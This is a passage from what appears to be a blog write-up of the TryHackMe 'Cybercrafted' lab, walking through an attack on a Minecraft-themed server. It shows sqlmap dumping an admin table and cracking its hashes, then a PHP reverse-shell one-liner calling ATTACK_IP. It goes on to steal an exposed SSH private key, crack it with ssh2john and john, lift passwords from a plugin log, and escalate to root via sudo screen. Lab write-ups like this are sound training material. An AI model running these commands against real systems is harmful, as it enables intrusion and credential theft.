[05:18:30] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[05:18:30] [INFO] fetching current database
[05:18:30] [INFO] fetching tables for database: 'webapp'
[05:18:30] [INFO] fetching columns for table 'admin' in database 'webapp'
[05:18:30] [INFO] fetching entries for table 'admin' in database 'webapp'
[05:18:30] [INFO] recognized possible password hashes in column 'hash'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[05:18:30] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/txt/wordlist.zip' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
&gt; 1
[05:18:30] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[05:18:30] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[05:18:30] [INFO] starting 2 processes 
[05:18:39] [WARNING] no clear password(s) found                                
Database: webapp
Table: admin
[2 entries]
+----+------------------------------------------+---------------------+
| id | hash                                     | user                |
+----+------------------------------------------+---------------------+
| 1  | 8xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx1 | xXUxxxxxxxxxxxxxxxx |
| 4  | THM{bxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx8}    | web_flag            |
+----+------------------------------------------+---------------------+
</pre></table></code></div></div><blockquote><p>What is the admin’s username?</p></blockquote><blockquote><p>What is the the web flag?</p></blockquote><h3 id="code-execution"><span class="mr-2"><strong>Code Execution</strong></span><a href="#code-execution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>There are a few ways to go about using the hash we see here. I prefer to just run the hash against a rainbow table for some low hanging fruit. Should that not work, there’s always JohnTheRipper or HashCat. Going to <a href="https://crackstation.net/">CrackStation</a>, I pop the hash in the field, click submit, and get a hit</p><p><img data-src="/assets/img/post_images/cybercrafted/Inkedscreenshot10.jpg" alt="" data-proofer-ignore></p><p>Now that we have credentials, we can try to login to the admin panel at <code class="language-plaintext highlighter-rouge">admin.cybercrafted.thm</code>.</p><p>We have a successful login with an interesting page</p><p><img data-src="/assets/img/post_images/cybercrafted/screenshot11.png" alt="" data-proofer-ignore></p><p>Typing in <code class="language-plaintext highlighter-rouge">id</code> returns <code class="language-plaintext highlighter-rouge">uid=33(www-data) gid=33(www-data) groups=33(www-data)</code>. So this returns any system command from the host machine. With this page being ran by php, I’m going to play it safe and try setting up a php reverse shell. First I’ll setup a netcat listener in my terminal</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>~# nc -lvnp 8080
Listening on [0.0.0.0] (family 0, port 8080)
</pre></table></code></div></div><p>Then I’ll modify the php reverse shell script I snagged off of <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>php -r '$sock=fsockopen("ATTACK_IP",8080);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
</pre></table></code></div></div><p>and paste into the panel.php page and click enter. Going back to the terminal, there is a successful connection!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>~# nc -lvnp 8080
Listening on [0.0.0.0] (family 0, port 8080)
Connection from 10.10.155.126 54646 received!
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ uname -a
Linux cybercrafted 4.15.0-159-generic #167-Ubuntu SMP Tue Sep 21 08:55:05 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
$ hostname
cybercrafted
</pre></table></code></div></div><p>Since this box has <code class="language-plaintext highlighter-rouge">python3</code>, I’ll setup a more stable shell with python. You can follow this <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">guide</a> to do the same. Just remember to use <code class="language-plaintext highlighter-rouge">python3</code> instead of <code class="language-plaintext highlighter-rouge">python</code> when running the commands.</p><h2 id="lateral-movement"><span class="mr-2"><strong>Lateral Movement</strong></span><a href="#lateral-movement" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>I tend to view which users are on a machine when I first get onto a box. Checking out /home I find there are two users.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>www-data@cybercrafted:/var/www/admin$ ls -al /home
total 16
drwxr-xr-x  4 root                root                4096 Jun 27 17:50 .
drwxr-xr-x 24 root                root                4096 Sep 30 13:14 ..
drwxr-x---  4 cybercrafted        cybercrafted        4096 Sep 12 10:33 cybercrafted
drwxr-xr-x  5 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Oct 15 20:43 xxxxxxxxxxxxxxxxxxx
</pre></table></code></div></div><p>What’s interesting here is the permission on the users folder. Even though this folder is owned by the admin, the permissions show that anyone can navigate into the admins home folder. So we’ll do just that.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>www-data@cybercrafted:/home/xxxxxxxxxxxxxxxxxxx$ ls -al
total 32
drwxr-xr-x 5 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Oct 15 20:43 .
drwxr-xr-x 4 root                root                4096 Jun 27 17:50 ..
lrwxrwxrwx 1 root                root                   9 Sep 12 10:38 .bash_history -&gt; /dev/null
-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx  220 Jun 27 09:19 .bash_logout
-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 3771 Jun 27 09:19 .bashrc
drwx------ 2 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Jun 27 09:38 .cache
drwx------ 3 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Jun 27 09:38 .gnupg
-rw-rw-r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx    0 Jun 27 17:40 .hushlogin
-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx  807 Jun 27 09:19 .profile
drwxrwxr-x 2 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Jun 27 09:35 .ssh
lrwxrwxrwx 1 root                root                   9 Oct 15 20:43 .viminfo -&gt; /dev/null
</pre></table></code></div></div><p>The SSH folder is also open to us. Let’s keep this going…</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>www-data@cybercrafted:/home/xxxxxxxxxxxxxxxxxxx/.ssh$ ls -al
total 16
drwxrwxr-x 2 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Jun 27 09:35 .
drwxr-xr-x 5 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Oct 15 20:43 ..
-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx  414 Jun 27 09:33 authorized_keys
-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 1766 Jun 27 09:33 id_rsa
</pre></table></code></div></div><p>I see a private key (<code class="language-plaintext highlighter-rouge">id_rsa</code>) that is viewable to anyone. I’m going to copy the contents of the file and paste them into a file on my machine and use that private key to attempt to login as this user.</p><p>First we need to cat out the file</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>www-data@cybercrafted:/home/xxxxxxxxxxxxxxxxxxx/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6

Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
---[snip]---
</pre></table></code></div></div><p>Then copy and paste the contents into a file on our own box. Don’t forget to change the permissions of the file after you save it: <code class="language-plaintext highlighter-rouge">chmod 400 admin_rsa</code></p><p>With the private key, we can now attempt to login as the admin:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>root@ip-10-10-168-165:~# ssh -i admin_rsa xxxxxxxxxxxxxxxxxxx@10.10.155.126
The authenticity of host '10.10.155.126 (10.10.155.126)' can't be established.
ECDSA key fingerprint is SHA256:okt+zU5MJ0D6EUFqOILqeZ9l1c9p53AxM90JQpBvfvg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.155.126' (ECDSA) to the list of known hosts.
Enter passphrase for key 'admin_rsa': 
</pre></table></code></div></div><p>It appears the private key has passphrase. No worries, <code class="language-plaintext highlighter-rouge">ssh2john.py</code> can pull the hash off of the key for us. Once we have the hash, JohnTheRipper can be used to decypt the hash file.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>root@ip-10-10-168-165:~# /opt/john/ssh2john.py admin_rsa &gt; admin_rsa.hash
root@ip-10-10-168-165:~# john --wordlist=/usr/share/wordlists/rockyou.txt admin_rsa.hash
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xxxxxxxxxxx      (admin_rsa)
1g 0:00:00:16 DONE (2021-11-21 06:20) 0.05906g/s 847117p/s 847117c/s 847117C/s *7¡Vamos!
Session completed.
</pre></table></code></div></div><p>With the passphrase now in hand, we can try to ssh once again:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>root@ip-10-10-168-165:~# ssh -i admin_rsa xxxxxxxxxxxxxxxxxxx@10.10.155.126
Enter passphrase for key 'admin_rsa': 
xxxxxxxxxxxxxxxxxxx@cybercrafted:~$ 
</pre></table></code></div></div><p>And we’re in!</p><p>First things first, we need to learn more about this user. We should see what groups they are associate with. To do this, we can use <code class="language-plaintext highlighter-rouge">cat /etc/group</code> to view all groups and see who’s associated with each one, or we can just use the command <code class="language-plaintext highlighter-rouge">groups</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>xxxxxxxxxxxxxxxxxxx@cybercrafted:~$ groups
xxxxxxxxxxxxxxxxxxx minecraft
</pre></table></code></div></div><p>It appears our user is a part of the <code class="language-plaintext highlighter-rouge">minecraft</code> group. Next we should see what files this group can view.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>xxxxxxxxxxxxxxxxxxx@cybercrafted:~$ find / -type f -group minecraft 2&gt;/dev/null
/opt/minecraft/note.txt
/opt/minecraft/minecraft_server_flag.txt
/opt/minecraft/cybercrafted/help.yml
/opt/minecraft/cybercrafted/commands.yml
/opt/minecraft/cybercrafted/world/level.dat_mcr
/opt/minecraft/cybercrafted/world/session.lock
/opt/minecraft/cybercrafted/world/DIM-1/data/villages.dat
/opt/minecraft/cybercrafted/world/DIM-1/forcedchunks.dat
--[snip]--
</pre></table></code></div></div><p>This command says to <code class="language-plaintext highlighter-rouge">find</code> starting at root (/) all files (-type f) with group minecraft and send all errors to the abyss (/dev/null).</p><p>And near the top, we see <code class="language-plaintext highlighter-rouge">minecraft_server_flag.txt</code></p><blockquote><p>Can you get the Mincraft server flag?</p></blockquote><p>In the <code class="language-plaintext highlighter-rouge">/opt/minecraft</code> directory, there is also a note which reads:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
- cybercrafted

P.S
Will remove the whitelist soon.
</pre></table></code></div></div><p>This leads into the next question. We navigated into the <code class="language-plaintext highlighter-rouge">cybercrafted</code> directory and list out the contents, there is a <code class="language-plaintext highlighter-rouge">plugins</code> directory</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>xxxxxxxxxxxxxxxxxxx@cybercrafted:/opt/minecraft/cybercrafted$ ls -al
total 19568
drwxr-x--- 7 cybercrafted minecraft     4096 Jun 27 16:53 .
drwxr-x--- 4 cybercrafted minecraft     4096 Jun 27 17:24 ..
-rwxr-x--- 1 cybercrafted minecraft      109 Nov 21 14:25 banned-ips.txt
-rwxr-x--- 1 cybercrafted minecraft      109 Nov 21 14:25 banned-players.txt
-rwxr-x--- 1 cybercrafted minecraft     1491 Nov 21 14:25 bukkit.yml
-rwxr-x--- 1 cybercrafted minecraft      623 Nov 21 14:25 commands.yml
-rwxr-x--- 1 cybercrafted minecraft 19972709 Jun 27 08:21 craftbukkit-1.7.2-server.jar
-rwxr-x--- 1 cybercrafted minecraft     2576 Jun 27 08:22 help.yml
drwxr-x--- 2 cybercrafted minecraft     4096 Nov 21 14:25 logs
-rwxr-x--- 1 cybercrafted minecraft        0 Nov 21 14:25 ops.txt
-rwxr-x--- 1 cybercrafted minecraft        0 Jun 27 08:22 permissions.yml
drwxr-x--- 3 cybercrafted minecraft     4096 Jun 27 08:25 plugins
-rwxr-x--- 1 cybercrafted minecraft     6441 Jun 27 09:08 server-icon.png
-rwxr-x--- 1 cybercrafted minecraft      813 Nov 21 14:25 server.properties
-rwxr-x--- 1 cybercrafted minecraft        0 Jun 27 08:22 white-list.txt
drwxr-x--- 9 cybercrafted minecraft     4096 Nov 21 14:50 world
drwxr-x--- 5 cybercrafted minecraft     4096 Jun 27 08:51 world_nether
drwxr-x--- 5 cybercrafted minecraft     4096 Nov 21 14:50 world_the_end
</pre></table></code></div></div><p>Within plugins, there is only one directory and that directory contains some interesting files.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>xxxxxxxxxxxxxxxxxxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/xxxxxxxxxxx$ ls -al
total 24
drwxr-x--- 2 cybercrafted minecraft 4096 Oct  6 09:59 .
drwxr-x--- 3 cybercrafted minecraft 4096 Jun 27 08:25 ..
-rwxr-x--- 1 cybercrafted minecraft  667 Nov 21 14:25 language.yml
-rwxr-x--- 1 cybercrafted minecraft  943 Nov 21 14:25 log.txt
-rwxr-x--- 1 cybercrafted minecraft   90 Jun 27 13:32 passwords.yml
-rwxr-x--- 1 cybercrafted minecraft   25 Nov 21 14:25 settings.yml
</pre></table></code></div></div><blockquote><p>What is the name of the sketchy plugin?</p></blockquote><p>Naturally we would gravitate towards <code class="language-plaintext highlighter-rouge">passwords.yml</code>. The password hashes in this yaml file do not provide any use to us. We could attempt to run <code class="language-plaintext highlighter-rouge">hashcat</code> or <code class="language-plaintext highlighter-rouge">john</code> against these MD5 hashes, but we would only be able to decrypt the <code class="language-plaintext highlighter-rouge">madrinch</code> user and not the <code class="language-plaintext highlighter-rouge">cybercrafted</code> user. There are only three other files in this directory and I’m thinking <code class="language-plaintext highlighter-rouge">logs.txt</code> or possibly <code class="language-plaintext highlighter-rouge">settings.yml</code> might have some useful info.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>xxxxxxxxxxxxxxxxxxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/xxxxxxxxxxx$ cat log.txt

[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet xxxxxxxxxxx!
[2021/06/27 11:25:16] cybercrafted registered. PW: xxxxxxxxxxxxxxxxxxx
[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet xxxxxxxxxxx!
[2021/06/27 11:47:34] cybercrafted logged in. PW: xxxxxxxxxxxxxxxxxxx
[2021/06/27 11:52:13] [BUKKIT-SERVER] Startet xxxxxxxxxxx!
[2021/06/27 11:57:29] [BUKKIT-SERVER] Startet xxxxxxxxxxx!
[2021/06/27 11:57:54] cybercrafted logged in. PW: xxxxxxxxxxxxxxxxxxx
[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet xxxxxxxxxxx!
[2021/06/27 11:58:46] cybercrafted logged in. PW: xxxxxxxxxxxxxxxxxxx
[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet xxxxxxxxxxx!
[2021/06/27 11:59:01] madrinch logged in. PW: Password123


[2021/10/15 17:13:45] [BUKKIT-SERVER] Startet xxxxxxxxxxx!
[2021/10/15 20:36:21] [BUKKIT-SERVER] Startet xxxxxxxxxxx!
[2021/10/15 21:00:43] [BUKKIT-SERVER] Startet xxxxxxxxxxx!
</pre></table></code></div></div><p>That spells it out easy enough for us. With the <code class="language-plaintext highlighter-rouge">cybercrafted</code> users password in hand, we can try to switch user (<code class="language-plaintext highlighter-rouge">su</code>)</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>xxxxxxxxxxxxxxxxxxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/xxxxxxxxxxx$ su cybercrafted
Password: 
cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/xxxxxxxxxxx$
</pre></table></code></div></div><h2 id="privilege-escalation"><span class="mr-2"><strong>Privilege Escalation</strong></span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Knowing what permissions a user is allowed to do, <code class="language-plaintext highlighter-rouge">sudo</code> is a pretty important one. We can view what sudo privileges the user can perform by typing <code class="language-plaintext highlighter-rouge">sudo -l</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>cybercrafted@cybercrafted:~$ sudo -l
[sudo] password for cybercrafted: 
Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted
</pre></table></code></div></div><p>This user is allowed to run the command <code class="language-plaintext highlighter-rouge">/usr/bin/screen -r cybercrafted</code> with sudo. Screen is a windows manager for terminals much like tmux. So if we can use sudo to launch screen, we should be able to spawn terminals from screen which should inherit root privileges.</p><p>Searching <a href="https://linuxize.com/post/how-to-use-linux-screen/">online</a> we can find what commands to use to spawn shells from screen or we can use the linux manual to dig through the commands (<code class="language-plaintext highlighter-rouge">man screen</code>). When we run the command, we are reattaching to an existing session (<code class="language-plaintext highlighter-rouge">-r cybercrafted</code>) and from there all we have to is spawn new window with a shell (ctl+a c).</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre># whoami
root
# id
uid=0(root) gid=1002(cybercrafted) groups=1002(cybercrafted)
# ls -al /root
total 52
drwx------  6 root root  4096 Oct 15 20:46 .
drwxr-xr-x 24 root root  4096 Sep 30 13:14 ..
lrwxrwxrwx  1 root root     9 Sep 12 09:33 .bash_history -&gt; /dev/null
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 Jun 27 17:49 .cache
drwx------  3 root root  4096 Jun 27 17:49 .gnupg
drwxr-xr-x  3 root root  4096 Oct  4 16:08 .local
-rw-------  1 root root   664 Sep 12 10:27 .mysql_history
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r-----  1 root root    38 Jun 27 17:30 root.txt
drwx------  2 root root  4096 Jun 27 17:45 .ssh
-rw-------  1 root root 10959 Oct 15 20:46 .viminfo 
</pre></table></code></div></div><blockquote><p>Finish the job and give me the root flag!</p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >sqli</a> <a href="/tags/sqlmap/" class="post-tag no-text-decoration" >sqlmap</a> <a href="/tags/ssh2john/" class="post-tag no-text-decoration" >ssh2john</a> <a href="/tags/screen/" class="post-tag no-text-decoration" >screen</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Cybercrafted - Gore-Ez-Knee&amp;url=https://gore-ez-knee.github.io/posts/cybercrafted/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Cybercrafted - Gore-Ez-Knee&amp;u=https://gore-ez-knee.github.io/posts/cybercrafted/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://gore-ez-knee.github.io/posts/cybercrafted/&amp;text=Cybercrafted - Gore-Ez-Knee" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/kali-cloud-novnc/">Stream Kali Linux to your Browser from AWS</a><li><a href="/posts/backup-restore-gitlab/">Backup/Restore GitLab</a><li><a href="/posts/getting-started-cybersecurity/">Intro to Cybersecurity</a><li><a href="/posts/htb-ca-2022-writeup-table/">HTB Cyber Apocalypse CTF - Table of Write-ups</a><li><a href="/posts/elastic-install/">Quickstart Elastic Stack</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/gitlab/">gitlab</a> <a class="post-tag" href="/tags/ubuntu/">ubuntu</a> <a class="post-tag" href="/tags/docker-compose/">docker-compose</a> <a class="post-tag" href="/tags/elastic/">elastic</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a> <a class="post-tag" href="/tags/evt/">evt</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/kali-cloud-novnc/"><div class="card-body"> <em class="timeago small" data-ts="1664118000" > 2022-09-25 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Stream Kali Linux to your Browser from AWS</h3><div class="text-muted small"><p> Have you ever wanted to: Stand up an instance of a Kali desktop environment in the cloud to perform testing? Spin up a Linux desktop environment to bypass workspace restrictions? Browse webs...</p></div></div></a></div><div class="card"> <a href="/posts/backup-restore-gitlab/"><div class="card-body"> <em class="timeago small" data-ts="1654354800" > 2022-06-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Backup/Restore GitLab</h3><div class="text-muted small"><p> Do you have a small GitLab container running on an instance in AWS for yourself or a small team? Have you ever needed to back-up GitLab and move it to another machine wether that be on another inst...</p></div></div></a></div><div class="card"> <a 